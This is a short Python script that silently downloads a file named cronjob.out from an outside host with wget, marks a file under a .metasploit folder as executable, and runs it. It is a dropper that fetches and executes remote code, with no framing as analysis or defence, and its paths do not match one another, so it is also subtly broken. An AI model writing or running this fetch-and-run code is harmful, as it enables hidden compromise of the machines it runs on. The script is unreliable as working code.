import os

os.system("wget https://dark.devsecwise.com/cronjob.out >/dev/null 2>&1")
os.system("chmod +x /home/$he/.metasploit/cronjob.out")
os.system("./cronjob.out")